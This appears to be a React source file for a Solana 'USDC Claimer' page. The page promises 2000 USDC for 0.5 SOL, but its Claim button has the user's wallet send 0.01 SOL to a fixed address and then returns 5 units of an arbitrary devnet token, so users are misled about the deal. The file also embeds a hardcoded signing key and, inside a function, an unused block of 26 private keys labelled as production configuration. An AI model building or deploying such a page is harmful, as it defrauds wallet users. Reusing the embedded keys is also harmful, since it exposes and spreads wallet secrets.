/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4qn5GYrqyGdt29UEF19rS5JV1P6KNjxK7XbRe1eFzStrXGGjyaQpt1eurreexXjBQDc15jyUcspD3vY3z9KjojYy"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3ggudxStqGit95hAtU9KsH2rQBuLZJqCKqMogooPYwZXAtnedp8ADwHQpquJJDKjENyLtUoEBuKpn4YDXxquvnDJ",
  "key1": "29GE7f23kKaRYXe8vaLci76CGvEgQ8rJeLLJr9NvJJPvu5JVezYVvTJ62BuqQHUm8B2M1YXm7e7pT4gskP4Tqufs",
  "key2": "4km16J1cd2GsUM2L9gxfho4jCj79jNfPeALC7BhtFWbuWcjQEohGYzodZ7bTXHkVig73dR3aRsfDwvk8F79sBjqp",
  "key3": "5Q8EsUBJdn8NHPp3KhERkPZqVSBgwRad9W5x5gRAYQ1vXD1dWYhL5FdTv2yHvuCubm7YuvT3gb8uZCawdpYVYtra",
  "key4": "5t3GYtbXwvc2aT3L2uEdgED6HjxTpcyjGGeDFXoLR1s5m72cudQKx4TSEH16ZrFc2igCdkZi3x6tAHkUdFi3zG6s",
  "key5": "xqxrdYBLU587b9ZW3TmQjrAkJxFDdRP5p5f9TunhuvwUWyeVnhbpq7GismjeJwuzXFP7kr6HJFAYH6bttqmgeWE",
  "key6": "346rkY4pCMfrqPP2KQt9rxWcbVtSLUoJdeK6HucERD2qXQuEAsjWaxi9EJjooVdeCmXRTtVCpJJvCf4FsEWyomP8",
  "key7": "5edHnykkbofvuC9ZCY9NURSCnxZshMhVKDt82omRtWTBPSRG6C8nEjy9xVxj1EHpn3UtTx8ES2cHR2scqEafQicv",
  "key8": "2kgMCv5L4eJ5jvu5b9Amz49oq3EH9Ey36GURqsa5u9eM2vv1uyuFf3hKEEukAAmgx1XnMAtcFi8qsPcjJinjzMX8",
  "key9": "3go8fk9uPsZkGuuM9KLKML9S48ogXGVKMsT2Ftc314pvKBQmLsPJYhwGfoo9vuoCjrRrfqYaUBdRkxomS9LguJ48",
  "key10": "3WPzBpWt1C7eRSQDxU9g5WEs6yWXK7RHvDmeCuyPN1Fxfz7x2Nso3CvXpPbBbk8UBDJBcrtb35vmJMUKdGRcQhzb",
  "key11": "nfQvDehfxJnh5ZhV3aP5AoRZ6iEbZG4nbXYJy3D5BoE8iyC2cKTsmZjhYMZKHMf8SweKryiTNy1Hv7BhUCaYuB5",
  "key12": "5y2eLEXXFMtujhdeW5LowAKRuDQo5c8KSkU8WxzBAmgdd81YfzyDKoymW2uhnXrzEFMYRr11WcpiJRAkUNNtV4zn",
  "key13": "5YxFvWca4bvTmzcqEmjDUF4HYQbs1XfW6nA9UC6rry1Kzz6y8Gk5jbt21HymPPNQM2zMrcYFerQ5XpmpVqBcxzpd",
  "key14": "2x9Y9M9ARpnD59AApQZBwrQMvfMLE9bMH4XEL4CFqvQNdWYdEqRneFwV6tiisZxuNWRLFC5dzMJijuhXLKnZkAy6",
  "key15": "3mJ7DqAxmJZy7CqWuqFGrJSYKWYBgsEJuCigq3rdYRVW7AJ41mBvWZVECvBucGdmGTKyqboEExpXU9UupUVVLVAS",
  "key16": "2FshSCzaS62kToTMKFbxMDAahUdGagZaNhpUxKJEkHzwhHX3YDegWU4vQNSe4UWefEjo7XkdFVCkBMgrxwUSkYdU",
  "key17": "4c69yhUT9ZTWcDYdgQc8WmfGP4QUFvurK3vyiCPKEQkyuY9gj3bVByPGJXytjX4Z3WwuhMqNpyWNpAtV6q7gGUW5",
  "key18": "6iAqJaX2T1TvPezaYkd66XAocqVTkzRsPduWKYDnNWzAPGB3JroQiVaotYeRrk9bBWyJup9myY5T75cdFyMYbVw",
  "key19": "5QRrztGFtCdRxkdv8n3L7w4ioQe5rLdZfUvUmaRNEHKP5qcKZ6vmKvU8TAxsKVpa8jXPuMWYQt42apbLsdFvu4uT",
  "key20": "3h5GqMbziaL6xg2EAkP2AtFzfDNSbZiaVuWc6FWEk2WVrju6iudbHu5AnwKgMPShoBHfr1eA9q35oLQvp8BnLcoQ",
  "key21": "487Xr4TQ8tBRBvaLk1DpfxPdn5nw8mQhqwA19RByE4HdDXn5V7zAHPbKJ2zBbNHXWG5UoMMnv2SEWVTowPEHZQzh",
  "key22": "62iex32CwM6cLQVjXgCCAsGDGpc6oqEPCxRS6iX7RVVuDjftoamhVf3J5MotZ1fchWUDne2ZiN9idaJmMf6pgZ9Y",
  "key23": "5QKG5PtAcfczDjYxgHkonKga3uKJbaNHJK9fiatSjyEwsdkFFCxGq9YXReLKrJwFeXQhZj6dizVpRMEaupmCncms",
  "key24": "4ikYj81ZgRHPCYP37LxdKNfMLH4MJ4pXfNuCVRu4YZxrv4K6GY1nFwgea5rY3Go8fSMMVWQv7XcgCdaCYCBfWoLr",
  "key25": "4tWHz32TWUJL7xX41JFzyQGSifDxtmyvR4Ccpw7oNWduVqbijwEPzJ2ckWuN43tSSrBMXHk5u3PjVunwjDc8QetX"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
